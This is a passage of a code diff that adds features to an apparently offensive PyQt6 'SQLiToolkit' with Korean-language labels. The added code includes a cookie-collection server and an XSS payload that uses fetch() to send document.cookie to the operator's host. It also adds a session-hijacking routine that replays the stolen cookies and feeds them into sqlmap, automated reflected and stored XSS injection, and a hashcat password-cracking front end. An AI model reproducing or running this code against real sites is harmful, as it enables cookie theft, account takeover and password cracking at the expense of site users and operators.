+                        self._log(f"  [SQLi 에러] '{err}' 감지!\n", "error")
+                        break
+
+        except Exception as e:
+            log(f"  [오류] {e}\n", RED)
+
+    # ── 쿠키 수신 서버 ──────────────────────────────────
+    def _start_cookie_server(self):
+        port = int(self.cookie_srv_port.text().strip() or 8877)
+        if self._cookie_server:
+            QMessageBox.warning(self,"알림","이미 실행 중"); return
+        try:
+            from http.server import HTTPServer, BaseHTTPRequestHandler
+            import urllib.parse as up
+
+            toolkit = self
+
+            class CookieHandler(BaseHTTPRequestHandler):
+                def do_GET(self):
+                    parsed = up.urlparse(self.path)
+                    qs     = up.parse_qs(parsed.query)
+                    cookie = qs.get("c", ["(없음)"])[0]
+                    ip     = self.client_address[0]
+                    now    = datetime.now().strftime("%H:%M:%S")
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b"ok")
+                    from PyQt6.QtCore import QMetaObject, Qt
+                    toolkit._stolen_data = (now, ip, cookie)
+                    QMetaObject.invokeMethod(
+                        toolkit, "_on_cookie_received",
+                        Qt.ConnectionType.QueuedConnection)
+
+                def log_message(self, *args): pass
+
+            self._cookie_server = HTTPServer(("0.0.0.0", port), CookieHandler)
+            self._srv_thread = threading.Thread(
+                target=self._cookie_server.serve_forever, daemon=True)
+            self._srv_thread.start()
+            self.cookie_srv_status.setText(f"● 수신 중  :{port}")
+            self.cookie_srv_status.setStyleSheet(f"color:{ACCENT}; border:none;")
+            self.srv_start_btn.setEnabled(False)
+            self.srv_stop_btn.setEnabled(True)
+            self._xss_log(f"쿠키 수신 서버 시작  포트:{port}\n", ACCENT)
+            # 페이로드 업데이트
+            my_ip = self._get_local_ip()
+            self.cookie_payload_view.setText(
+                f'<script>fetch("http://{my_ip}:{port}/?c="+document.cookie)</script>')
+        except Exception as e:
+            QMessageBox.critical(self,"오류", f"서버 시작 실패: {e}")
+
+    def _stop_cookie_server(self):
+        if self._cookie_server:
+            self._cookie_server.shutdown()
+            self._cookie_server = None
+        self.cookie_srv_status.setText("● 중지됨")
+        self.cookie_srv_status.setStyleSheet(f"color:{TEXT_DIM}; border:none;")
+        self.srv_start_btn.setEnabled(True)
+        self.srv_stop_btn.setEnabled(False)
+        self._xss_log("쿠키 수신 서버 중지\n", TEXT_DIM)
+
+    def _get_local_ip(self):
+        import socket
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except Exception:
+            return "127.0.0.1"
+
+    @pyqtSlot()
+    def _on_cookie_received(self):
+        now, ip, cookie = getattr(self, "_stolen_data", ("","",""))
+        self._xss_log(f"\n[쿠키 수신!]\n  IP : {ip}\n  쿠키 : {cookie}\n", RED)
+        item = QTreeWidgetItem([now, ip, cookie])
+        item.setForeground(0, QColor(YELLOW))
+        item.setForeground(2, QColor(ACCENT))
+        self.stolen_cookie_tree.addTopLevelItem(item)
+        self.stolen_cookie_tree.scrollToBottom()
+        self.xss_out_tab.setCurrentIndex(2)
+
+    def _use_stolen_cookie(self, item):
+        cookie = item.text(2)
+        self.hijack_cookie.setText(cookie)
+        # sqlmap / 스캐너 쿠키란에도 자동 입력
+        self.extra_entry.setText(f'--cookie="{cookie}"')
+        self.scan_cookie_entry.setText(cookie)
+        self.xss_cookie_entry.setText(cookie)
+        QMessageBox.information(self, "적용됨", "쿠키가 자동 입력됐어\n- sqlmap 추가 플래그\n- 취약점 스캐너 쿠키\n- XSS 탭 쿠키")
+
+    def _run_hijack(self):
+        url    = self.hijack_url.text().strip()
+        cookie = self.hijack_cookie.text().strip()
+        if not url or not cookie:
+            QMessageBox.critical(self,"오류","URL과 쿠키를 입력해줘"); return
+        if not url.startswith("http"): url = "http://"+url
+        threading.Thread(target=self._hijack_thread,
+                         args=(url, cookie), daemon=True).start()
+
+    def _hijack_thread(self, url, cookie):
+        try:
+            session = requests.Session()
+            session.headers["User-Agent"] = "Mozilla/5.0"
+            session.headers["Cookie"] = cookie
+            r = session.get(url, timeout=10, verify=False)
+            self._xss_log("\n" + "-"*44 + "\n", BORDER)
+            self._xss_log("  세션 하이재킹 테스트\n", YELLOW)
+            self._xss_log(f"  URL    : {url}\n", TEXT_DIM)
+            self._xss_log(f"  쿠키   : {cookie[:60]}...\n", TEXT_DIM)
+            self._xss_log(f"  응답   : {r.status_code}\n", ACCENT)
+            self._xss_log(f"  길이   : {len(r.text)} bytes\n", ACCENT)
+            # 로그인 성공 여부 힌트
+            hints = ["logout","로그아웃","my account","마이페이지",
+                     "welcome","환영","dashboard","관리자"]
+            found = [h for h in hints if h in r.text.lower()]
+            if found:
+                self._xss_log(f"  [✓ 세션 유효!] 키워드 감지: {', '.join(found)}\n", ACCENT)
+            else:
+                self._xss_log("  [-] 세션 유효성 불명확 (응답 직접 확인 필요)\n", TEXT_DIM)
+            # 응답 미리보기
+            preview = r.text[:300].replace("\n"," ")
+            self._xss_log(f"\n  미리보기:\n  {preview}\n", TEXT_DIM)
+        except Exception as e:
+            self._xss_log(f"  [오류] {e}\n", RED)
+
+    def _stop_xss(self):
+        self._xss_stop = True
+
+    def _run_reflected_xss(self):
+        url = self.xss_url_entry.text().strip()
+        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
+        if not url.startswith("http"): url = "http://"+url
+        self._xss_stop = False
+        self.xss_log.clear()
+        self.xss_result_tree.clear()
+        self._xss_log("="*48+"\n", BORDER)
+        self._xss_log("  반사형 XSS 탐지 시작\n", BLUE)
+        self._xss_log("="*48+"\n\n", BORDER)
+        cookie = self.xss_cookie_entry.text().strip()
+        payloads = []
+        if self.xss_reflected_cb.isChecked():
+            payloads += XSS_PAYLOADS
+        if self.xss_cookie_cb.isChecked():
+            payloads += XSS_COOKIE_PAYLOADS
+        threading.Thread(
+            target=self._reflected_thread,
+            args=(url, cookie, payloads), daemon=True).start()
+
+    def _reflected_thread(self, url, cookie, payloads):
+        import time
+        session = requests.Session()
+        session.headers["User-Agent"] = "Mozilla/5.0"
+        if cookie: session.headers["Cookie"] = cookie
+
+        parsed = urllib.parse.urlparse(url)
+        qs     = urllib.parse.parse_qs(parsed.query)
+        if not qs:
+            self._xss_log("[오류] URL에 파라미터가 없어\n", RED); return
+
+        for param in qs.keys():
+            self._xss_log(f"\n[파라미터] {param} 테스트 중...\n", YELLOW)
+            for payload in payloads:
+                if self._xss_stop: break
+                try:
+                    test_qs = dict(qs)
+                    test_qs[param] = [payload]
+                    test_url = parsed._replace(
+                        query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
+                    r = session.get(test_url, timeout=8, verify=False)
+
+                    # 반사 확인
+                    if payload in r.text:
+                        self._xss_log(f"  [🚨 반사형] {param} | {payload[:40]}\n", RED)
+                        item = QTreeWidgetItem(["반사형 XSS", url[:40], param, payload[:35], "페이로드 반사 확인"])
+                        item.setForeground(0, QColor(RED))
+                        self.xss_result_tree.addTopLevelItem(item)
+                        self.xss_out_tab.setCurrentIndex(1)
+
+                    # 쿠키 노출 확인
+                    if "document.cookie" in payload and "cookie" in r.text.lower():
+                        self._xss_log(f"  [🍪 쿠키] 쿠키 관련 응답 감지\n", YELLOW)
+
+                    time.sleep(0.1)
+                except Exception as e:
+                    self._xss_log(f"  [오류] {e}\n", TEXT_DIM)
+
+        self._xss_log(f"\n✓ 반사형 XSS 탐지 완료\n", ACCENT)
+
+    def _run_stored_xss(self):
+        store_url = self.xss_store_url.text().strip()
+        data_tmpl = self.xss_store_data.text().strip()
+        check_url = self.xss_check_url.text().strip()
+        if not store_url or not data_tmpl or not check_url:
+            QMessageBox.critical(self,"오류","삽입 URL / POST 데이터 / 확인 URL 모두 입력해줘")
+            return
+        self._xss_stop = False
+        self.xss_log.clear()
+        self._xss_log("="*48+"\n", BORDER)
+        self._xss_log("  저장형 XSS 탐지 시작\n", YELLOW)
+        self._xss_log("="*48+"\n\n", BORDER)
+        cookie = self.xss_cookie_entry.text().strip()
+        threading.Thread(
+            target=self._stored_thread,
+            args=(store_url, data_tmpl, check_url, cookie), daemon=True).start()
+
+    def _stored_thread(self, store_url, data_tmpl, check_url, cookie):
+        import time
+        session = requests.Session()
+        session.headers["User-Agent"] = "Mozilla/5.0"
+        if cookie: session.headers["Cookie"] = cookie
+
+        for payload in XSS_PAYLOADS + XSS_COOKIE_PAYLOADS:
+            if self._xss_stop: break
+            try:
+                # 삽입
+                post_data = data_tmpl.replace("XSS_PAYLOAD", payload)
+                data_dict = dict(urllib.parse.parse_qsl(post_data))
+                self._xss_log(f"\n[삽입] {payload[:40]}...\n", TEXT_DIM)
+                session.post(store_url, data=data_dict, timeout=8, verify=False)
+                time.sleep(0.5)
+
+                # 확인
+                r = session.get(check_url, timeout=8, verify=False)
+                found = False
+                for marker in XSS_STORED_MARKERS:
+                    if marker.lower() in r.text.lower():
+                        found = True
+                        break
+
+                if found or payload in r.text:
+                    self._xss_log(f"  [🚨 저장형] 페이로드 반영 확인!\n", RED)
+                    item = QTreeWidgetItem([
+                        "저장형 XSS", check_url[:40], "POST",
+                        payload[:35], "저장 후 반영 확인"
+                    ])
+                    item.setForeground(0, QColor(YELLOW))
+                    self.xss_result_tree.addTopLevelItem(item)
+                    self.xss_out_tab.setCurrentIndex(1)
+                else:
+                    self._xss_log(f"  [-] 반영 안됨\n", TEXT_DIM)
+
+                time.sleep(0.3)
+            except Exception as e:
+                self._xss_log(f"  [오류] {e}\n", TEXT_DIM)
+
+        self._xss_log(f"\n✓ 저장형 XSS 탐지 완료\n", ACCENT)
+
     #  취약점 스캐너 탭
     # ══════════════════════════════════════════════════════
+    # ══════════════════════════════════════════════════════
+    #  Hashcat 탭
+    # ══════════════════════════════════════════════════════
+    def _build_hashcat_tab(self, parent):
+        lay = QHBoxLayout(parent)
+        lay.setContentsMargins(8,8,8,8)
+        lay.setSpacing(6)
+
+        left = QWidget(); left.setFixedWidth(360)
+        lay.addWidget(left)
+        self._build_hashcat_left(left)
+
+        right = QWidget()
+        lay.addWidget(right, 1)
+        self._build_hashcat_right(right)
+
+    def _build_hashcat_left(self, parent):
+        scroll = QScrollArea()
+        scroll.setWidgetResizable(True)
+        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+        inner = QWidget()
+        lay   = QVBoxLayout(inner)
+        lay.setContentsMargins(12,8,12,8)
+        lay.setSpacing(6)
+        scroll.setWidget(inner)
+        outer = QVBoxLayout(parent)
+        outer.setContentsMargins(0,0,0,0)
+        outer.addWidget(scroll)
+
+        # 해시 입력
+        lay.addWidget(section_label("[ 해시 입력 ]", RED))
+        lay.addWidget(sep())
+        lay.addWidget(dim_label("해시값 (여러 개는 줄바꿈으로 구분)"))
+        self.hash_input = QTextEdit()
+        self.hash_input.setFixedHeight(100)
+        self.hash_input.setFont(QFont("Courier New", 11))
+        self.hash_input.setPlaceholderText(
+            "$P$Bh5IdBDsZL1Jmdu6tcXFs.bEXie4Io.\n"
+            "5f4dcc3b5aa765d61d8327deb882cf99\n"
+            "$2y$10$abcdefghijklmnopqrstuuVG..."
+        )
+        lay.addWidget(self.hash_input)
+
+        # 해시 타입 자동 감지
+        detect_row = QHBoxLayout()
+        self.hash_type_detect_btn = btn("🔍  타입 자동 감지", BLUE, "white", h=30)
+        self.hash_type_detect_btn.clicked.connect(self._detect_hash_type)
+        detect_row.addWidget(self.hash_type_detect_btn)
+        lay.addLayout(detect_row)
+
+        lay.addWidget(dim_label("해시 타입 (-m 값)"))
+        type_row = QHBoxLayout()
+        self.hash_type_combo = QComboBox()
+        self.hash_type_combo.setEditable(True)
+        hash_types = [
+            ("0",    "MD5"),
+            ("100",  "SHA1"),
+            ("1400", "SHA256"),
+            ("1800", "sha512crypt (Linux)"),
+            ("400",  "phpass (WordPress)"),
+            ("500",  "md5crypt (Unix)"),
+            ("1000", "NTLM (Windows)"),
+            ("3200", "bcrypt"),
+            ("1500", "DES (Unix)"),
+            ("5500", "NetNTLMv1"),
+            ("5600", "NetNTLMv2"),
+        ]
+        for code, name in hash_types:
+            self.hash_type_combo.addItem(f"{code}  ─  {name}", code)
+        self.hash_type_combo.setCurrentIndex(4)  # phpass 기본
+        type_row.addWidget(self.hash_type_combo)
+        lay.addLayout(type_row)
+        self.hash_type_hint = QLabel("")
+        self.hash_type_hint.setStyleSheet(f"color:{ACCENT}; font-size:11px;")
+        self.hash_type_hint.setWordWrap(True)
+        lay.addWidget(self.hash_type_hint)
+
+        # 공격 모드
+        lay.addSpacing(4)
+        lay.addWidget(section_label("[ 공격 모드 ]", YELLOW))
+        lay.addWidget(sep())
+        self.attack_grp = QButtonGroup(self)
+        attack_modes = [
+            (0, "사전 공격 (Wordlist)"),
+            (3, "무차별 대입 (Brute-force)"),
+            (6, "Wordlist + 규칙"),
+        ]
+        for mode_id, label in attack_modes:
+            rb = QRadioButton(label)
+            rb.setChecked(mode_id == 0)
+            self.attack_grp.addButton(rb, mode_id)
+            lay.addWidget(rb)
+        self.attack_grp.buttonClicked.connect(self._on_attack_mode_change)
+
+        # Wordlist
+        self.wordlist_frame = QWidget()
+        wl_lay = QVBoxLayout(self.wordlist_frame)
+        wl_lay.setContentsMargins(0,4,0,0)
+        wl_lay.addWidget(dim_label("Wordlist 파일"))
+        wl_row = QHBoxLayout()
+        self.wordlist_entry = QLineEdit()
+        self.wordlist_entry.setPlaceholderText("/usr/share/wordlists/rockyou.txt")
+        wl_row.addWidget(self.wordlist_entry)
+        wl_pick = btn("📂", BG3, TEXT_DIM, w=36, h=32)
+        wl_pick.clicked.connect(self._pick_wordlist)
+        wl_row.addWidget(wl_pick)
+        wl_lay.addLayout(wl_row)
+        lay.addWidget(self.wordlist_frame)
+
+        # Brute-force 마스크
+        self.mask_frame = QWidget()
+        mk_lay = QVBoxLayout(self.mask_frame)
+        mk_lay.setContentsMargins(0,4,0,0)
+        mk_lay.addWidget(dim_label("마스크 패턴"))
+        self.mask_entry = QLineEdit("?a?a?a?a?a?a")
+        mk_lay.addWidget(self.mask_entry)
+        mk_lay.addWidget(dim_label("?l=소문자  ?u=대문자  ?d=숫자  ?s=특수  ?a=전체"))
+        lay.addWidget(self.mask_frame)
+        self.mask_frame.hide()
+
+        # 추가 옵션
+        lay.addSpacing(4)
+        lay.addWidget(section_label("[ 옵션 ]"))
+        lay.addWidget(sep())
+        self.hc_opt_vars = {}
+        for flag, desc, default in [
+            ("--force",          "GPU 경고 무시",     True),
+            ("--show",           "크랙된 결과만 표시", False),
+            ("--username",       "user:hash 형식",   False),
+            ("--increment",      "길이 점진적 증가",  False),
+        ]:
+            cb = QCheckBox(f"{flag}  ─  {desc}")
+            cb.setChecked(default)
+            self.hc_opt_vars[flag] = cb
+            lay.addWidget(cb)
+
+        lay.addWidget(dim_label("추가 플래그"))
+        self.hc_extra = QLineEdit()
+        self.hc_extra.setPlaceholderText("--increment-min=4 --increment-max=8")
+        lay.addWidget(self.hc_extra)
+
+        lay.addWidget(dim_label("hashcat 경로"))
+        self.hc_bin = QLineEdit()
+        self.hc_bin.setText(self._find_hashcat())
+        lay.addWidget(self.hc_bin)
+
+        lay.addSpacing(6)
+        lay.addWidget(sep())
+
+        run_row = QHBoxLayout()
+        self.hc_run_btn = btn("▶  크랙 시작", RED, "white", h=40)
+        self.hc_run_btn.clicked.connect(self._run_hashcat)
+        self.hc_stop_btn = btn("■  중지", BG3, TEXT_DIM, h=40)
+        self.hc_stop_btn.setEnabled(False)
+        self.hc_stop_btn.clicked.connect(self._stop_hashcat)
+        run_row.addWidget(self.hc_run_btn)
+        run_row.addWidget(self.hc_stop_btn)
+        lay.addLayout(run_row)
+        lay.addStretch()
+
+    def _build_hashcat_right(self, parent):
+        lay = QVBoxLayout(parent)
+        lay.setContentsMargins(0,0,0,0)
+
+        self.hc_out_tab = QTabWidget()
+        lay.addWidget(self.hc_out_tab)
+
+        # 실행 로그
+        log_w = QWidget()
+        ll = QVBoxLayout(log_w); ll.setContentsMargins(4,4,4,4)
+        self.hc_log = QTextEdit()
+        self.hc_log.setReadOnly(True)
+        self.hc_log.setFont(QFont("Courier New", 11))
+        ll.addWidget(self.hc_log)
+        bot = QWidget(); bot.setFixedHeight(30)
+        bot.setStyleSheet(f"background:{BG3};")
+        bl = QHBoxLayout(bot); bl.setContentsMargins(8,2,8,2)
+        self.hc_time_lbl = QLabel("")
+        self.hc_time_lbl.setStyleSheet(f"color:{TEXT_DIM}; font-size:10px;")
+        clr_btn = btn("클리어", BG3, TEXT_DIM, w=70, h=24)
+        clr_btn.clicked.connect(lambda: self.hc_log.clear())
+        bl.addWidget(clr_btn); bl.addStretch(); bl.addWidget(self.hc_time_lbl)
+        ll.addWidget(bot)
+        self.hc_out_tab.addTab(log_w, "📋  실행 로그")
+
+        # 크랙 결과
+        res_w = QWidget()
+        rl = QVBoxLayout(res_w); rl.setContentsMargins(4,4,4,4)
+
+        res_header = QWidget()
+        rhl = QHBoxLayout(res_header); rhl.setContentsMargins(0,0,0,4)
+        self.hc_result_count = QLabel("크랙된 해시: 0개")
+        self.hc_result_count.setStyleSheet(f"color:{ACCENT}; font-weight:bold;")
+        copy_all_btn = btn("전체 복사", BG3, TEXT_DIM, w=90, h=26)
+        copy_all_btn.clicked.connect(self._copy_hc_results)
+        rhl.addWidget(self.hc_result_count); rhl.addStretch(); rhl.addWidget(copy_all_btn)
+        rl.addWidget(res_header)
+
+        self.hc_result_tree = QTreeWidget()
+        self.hc_result_tree.setAlternatingRowColors(True)
+        self.hc_result_tree.setRootIsDecorated(False)
+        self.hc_result_tree.setHeaderLabels(["해시","크랙된 비밀번호","해시타입"])
+        self.hc_result_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
+        rl.addWidget(self.hc_result_tree)
+        rl.addWidget(dim_label("더블클릭 → 비밀번호 클립보드 복사"))
+        self.hc_result_tree.itemDoubleClicked.connect(
+            lambda item: QApplication.clipboard().setText(item.text(1)))
+        self.hc_out_tab.addTab(res_w, "🔑  크랙 결과")
+
+    # ── Hashcat 로직 ─────────────────────────────────────
+    def _find_hashcat(self):
+        for c in ["hashcat", "/opt/homebrew/bin/hashcat",
+                  "/usr/local/bin/hashcat", "/usr/bin/hashcat"]:
+            try:
+                r = subprocess.run([c, "--version"],
+                                   capture_output=True, text=True, timeout=3)
+                if r.returncode == 0: return c
+            except Exception: pass
+        return "hashcat"
+
+    def _on_attack_mode_change(self):
+        mode = self.attack_grp.checkedId()
+        self.wordlist_frame.setVisible(mode in (0, 6))
+        self.mask_frame.setVisible(mode == 3)
+
+    def _pick_wordlist(self):
+        path, _ = QFileDialog.getOpenFileName(
+            self, "Wordlist 선택", "/usr/share/wordlists",
+            "Text (*.txt);;All (*.*)")
+        if path: self.wordlist_entry.setText(path)
+
+    def _detect_hash_type(self):
+        hashes = self.hash_input.toPlainText().strip().splitlines()
+        if not hashes:
+            QMessageBox.critical(self,"오류","해시를 입력해줘"); return
+        h = hashes[0].strip()
+        detected = self._identify_hash(h)
+        self.hash_type_hint.setText(f"감지됨: {detected['name']}  (-m {detected['code']})")
+        # 콤보에서 해당 항목 선택
+        for i in range(self.hash_type_combo.count()):
+            if self.hash_type_combo.itemData(i) == detected["code"]:
+                self.hash_type_combo.setCurrentIndex(i)
+                break
+        self._hc_log(f"해시 타입 감지: {detected['name']}  (-m {detected['code']})\n", ACCENT)
+
+    def _identify_hash(self, h):
+        import re
+        h = h.strip()
+        if h.startswith("$P$") or h.startswith("$H$"):
+            return {"code":"400",  "name":"phpass (WordPress/Drupal)"}
+        if h.startswith("$2y$") or h.startswith("$2b$") or h.startswith("$2a$"):
+            return {"code":"3200", "name":"bcrypt"}
+        if h.startswith("$6$"):
+            return {"code":"1800", "name":"sha512crypt (Linux)"}
+        if h.startswith("$5$"):
+            return {"code":"7400", "name":"sha256crypt (Linux)"}
+        if h.startswith("$1$"):
+            return {"code":"500",  "name":"md5crypt (Unix)"}
+        if re.fullmatch(r"[0-9a-fA-F]{32}", h):
+            return {"code":"0",    "name":"MD5"}
+        if re.fullmatch(r"[0-9a-fA-F]{40}", h):
+            return {"code":"100",  "name":"SHA1"}
+        if re.fullmatch(r"[0-9a-fA-F]{64}", h):
+            return {"code":"1400", "name":"SHA256"}
+        if re.fullmatch(r"[0-9a-fA-F]{128}", h):
+            return {"code":"1700", "name":"SHA512"}
+        if re.fullmatch(r"[0-9a-fA-F]{16}", h):
+            return {"code":"1000", "name":"NTLM (Windows)"}
+        return {"code":"0", "name":"알 수 없음 (MD5 추정)"}
+
+    def _run_hashcat(self):
+        hashes = self.hash_input.toPlainText().strip()
+        if not hashes:
+            QMessageBox.critical(self,"오류","해시를 입력해줘"); return
+        hc_bin = self.hc_bin.text().strip() or "hashcat"
+        mode   = self.attack_grp.checkedId()
+        # 해시 타입
+        idx    = self.hash_type_combo.currentIndex()
+        m_code = self.hash_type_combo.itemData(idx) or "0"
+
+        # 임시 해시 파일 저장
+        import tempfile
+        self._hc_hash_file = tempfile.NamedTemporaryFile(
+            mode="w", suffix=".txt", delete=False)
+        self._hc_hash_file.write(hashes)
+        self._hc_hash_file.close()
+
+        cmd = [hc_bin, "-m", m_code, "-a", str(mode),
+               self._hc_hash_file.name]
+
+        if mode in (0, 6):
+            wl = self.wordlist_entry.text().strip()
+            if not wl:
+                QMessageBox.critical(self,"오류","Wordlist 파일을 선택해줘"); return
+            cmd.append(wl)
+        elif mode == 3:
+            mask = self.mask_entry.text().strip() or "?a?a?a?a?a?a"
+            cmd.append(mask)
+
+        for flag, cb in self.hc_opt_vars.items():
+            if cb.isChecked(): cmd.append(flag)
+
+        extra = self.hc_extra.text().strip()
+        if extra: cmd += extra.split()
+
+        self.hc_log.clear()
+        self.hc_result_tree.clear()
+        self._hc_results = []
+        self._hc_log("="*48+"\n", TEXT_DIM)
+        self._hc_log(f"  hashcat 실행\n", YELLOW)
+        self._hc_log(f"  모드: {mode}  타입: -m {m_code}\n", TEXT_DIM)
+        self._hc_log(f"$ {' '.join(cmd)}\n\n", ACCENT2)
+        self._hc_log("="*48+"\n\n", TEXT_DIM)
+
+        self.hc_run_btn.setEnabled(False)
+        self.hc_stop_btn.setEnabled(True)
+        self._set_status("● CRACKING", RED)
+
+        self._hc_process = None
+        threading.Thread(target=self._hc_thread, args=(cmd,), daemon=True).start()
+
+    def _hc_thread(self, cmd):
+        import re as re2
+        cracked = []
+        try:
+            self._hc_process = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT, text=True, bufsize=1)
+            for line in self._hc_process.stdout:
+                self._hc_log(line, self._hc_tag(line))
+                # 크랙 결과 파싱: hash:password
+                m = re2.match(r"^(.+):(.+)$", line.strip())
+                if m and len(m.group(1)) > 8:
+                    cracked.append((m.group(1), m.group(2)))
+                    QMetaObject.invokeMethod(
+                        self, "_hc_add_result",
+                        Qt.ConnectionType.QueuedConnection)
+                    self._hc_last = (m.group(1), m.group(2))
+            self._hc_process.wait()
+            rc = self._hc_process.returncode
+        except FileNotFoundError:
+            self._hc_log("\n[오류] hashcat을 찾을 수 없어\nbrew install hashcat\n", RED)
+            rc = -1
+        except Exception as e:
+            self._hc_log(f"\n[예외] {e}\n", RED); rc = -1
+
+        self._hc_cracked = cracked
+        QMetaObject.invokeMethod(self, "_hc_done",
+            Qt.ConnectionType.QueuedConnection)
+
+    def _hc_tag(self, line):
+        l = line.lower()
+        if "cracked" in l or "recovered" in l: return ACCENT
+        if "error" in l or "failed" in l:      return RED
+        if "warning" in l:                     return YELLOW
+        if "progress" in l or "speed" in l:    return BLUE
+        if ":" in line and len(line.strip()) > 10: return YELLOW
+        return TEXT_DIM
+
+    @pyqtSlot()
+    def _hc_add_result(self):
+        last = getattr(self, "_hc_last", None)
+        if not last: return
+        h, pw = last
+        item = QTreeWidgetItem([h[:50], pw, self.hash_type_combo.currentText()[:30]])
+        item.setForeground(1, QColor(ACCENT))
+        self.hc_result_tree.addTopLevelItem(item)
+        self.hc_result_count.setText(f"크랙된 해시: {self.hc_result_tree.topLevelItemCount()}개")
+        self.hc_out_tab.setCurrentIndex(1)
+
+    @pyqtSlot()
+    def _hc_done(self):
+        self.hc_run_btn.setEnabled(True)
+        self.hc_stop_btn.setEnabled(False)
+        cracked = getattr(self, "_hc_cracked", [])
+        self._hc_log(f"\n크랙 완료  |  {len(cracked)}개 발견\n", ACCENT if cracked else TEXT_DIM)
+        self._set_status(f"● DONE  |  {len(cracked)}개 크랙", ACCENT if cracked else TEXT_DIM)
+        # 임시 파일 삭제
+        try:
+            os.unlink(self._hc_hash_file.name)
+        except Exception: pass
+        self.hc_time_lbl.setText(datetime.now().strftime("%H:%M:%S"))
+
+    def _stop_hashcat(self):
+        if self._hc_process:
+            self._hc_process.terminate()
+            self._hc_log("\n[!] 강제 종료\n", YELLOW)
+        self.hc_run_btn.setEnabled(True)
+        self.hc_stop_btn.setEnabled(False)
+
+    def _copy_hc_results(self):
+        lines = []
+        for i in range(self.hc_result_tree.topLevelItemCount()):
+            item = self.hc_result_tree.topLevelItem(i)
+            lines.append(f"{item.text(0)}:{item.text(1)}")
+        if lines:
+            QApplication.clipboard().setText("\n".join(lines))
+            QMessageBox.information(self,"복사됨",f"{len(lines)}개 복사됨")
+
+    def _hc_log(self, text, color=None):
+        c = color or TEXT_DIM
+        cursor = self.hc_log.textCursor()
+        cursor.movePosition(QTextCursor.MoveOperation.End)
+        fmt = cursor.charFormat()
+        fmt.setForeground(QColor(c))
+        cursor.setCharFormat(fmt)
+        cursor.insertText(text)
+        self.hc_log.setTextCursor(cursor)
+        self.hc_log.ensureCursorVisible()
+        self.hc_time_lbl.setText(datetime.now().strftime("%H:%M:%S"))
+
     def _build_scanner_tab(self, parent):
         lay = QHBoxLayout(parent)
         lay.setContentsMargins(8,8,8,8); lay.setSpacing(6)
@@ -1039,6 +2276,63 @@ class SQLiToolkit(QMainWindow):
         path, _ = QFileDialog.getOpenFileName(self, "요청파일 선택","","Text (*.txt);;All (*.*)")
         if path: self.url_entry.setText(path)
 
+    def _detect_params(self, url, callback, btn=None):
+        """공통 파라미터 탐지 - callback(found) 으로 결과 전달"""
+        if not url: return
+        if not url.startswith("http"): url = "http://"+url
+        if btn: btn.setText("🔄  탐지 중..."); btn.setEnabled(False)
+        self._detect_callback = callback
+        self._detect_btn_ref  = btn
+        threading.Thread(target=self._detect_params_thread, args=(url,), daemon=True).start()
+
+    def _detect_params_thread(self, url):
+        try:
+            session = requests.Session()
+            session.headers["User-Agent"] = "Mozilla/5.0"
+            r = session.get(url, timeout=8, verify=False)
+            soup = BeautifulSoup(r.text, "html.parser")
+            found = []
+            parsed = urllib.parse.urlparse(url)
+            for key in urllib.parse.parse_qs(parsed.query):
+                full = parsed._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
+                found.append((f"[GET] ?{key}=", full))
+            for form in soup.find_all("form"):
+                action = urllib.parse.urljoin(url, form.get("action",""))
+                method = form.get("method","get").lower()
+                for inp in form.find_all(["input","textarea"]):
+                    name = inp.get("name")
+                    if name:
+                        if method == "get":
+                            found.append((f"[GET FORM] {name}", f"{action}?{name}=1"))
+                        else:
+                            found.append((f"[POST FORM] {name}", f"{action}||POST||{name}=1"))
+            for a in soup.find_all("a", href=True):
+                href = urllib.parse.urljoin(url, a["href"])
+                p2 = urllib.parse.urlparse(href)
+                for key in urllib.parse.parse_qs(p2.query):
+                    full = p2._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
+                    if not any(f[1]==full for f in found):
+                        found.append((f"[LINK] {p2.path}?{key}=", full))
+            self._detect_found_common = found
+        except Exception:
+            self._detect_found_common = []
+        from PyQt6.QtCore import QMetaObject
+        QMetaObject.invokeMethod(self, "_detect_params_done",
+            Qt.ConnectionType.QueuedConnection)
+
+    @pyqtSlot()
+    def _detect_params_done(self):
+        found = getattr(self, "_detect_found_common", [])
+        btn   = getattr(self, "_detect_btn_ref", None)
+        cb    = getattr(self, "_detect_callback", None)
+        if btn: btn.setText("🔎  파라미터 자동 탐지"); btn.setEnabled(True)
+        if cb: cb(found)
+
+    def _xss_auto_detect(self):
+        url = self.xss_url_entry.text().strip()
+        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
+        self._detect_params(url, self._xss_detect_done, self.xss_detect_btn)
+
     def _auto_detect(self):
         url = self.url_entry.text().strip()
         if not url: QMessageBox.critical(self,"오류","URL을 입력해줘"); return
@@ -1084,8 +2378,6 @@ class SQLiToolkit(QMainWindow):
             from PyQt6.QtCore import QMetaObject
             QMetaObject.invokeMethod(self, "_detect_done_slot",
                 Qt.ConnectionType.QueuedConnection)
-
-    from PyQt6.QtCore import pyqtSlot
 
     @pyqtSlot()
     def _detect_done_slot(self):
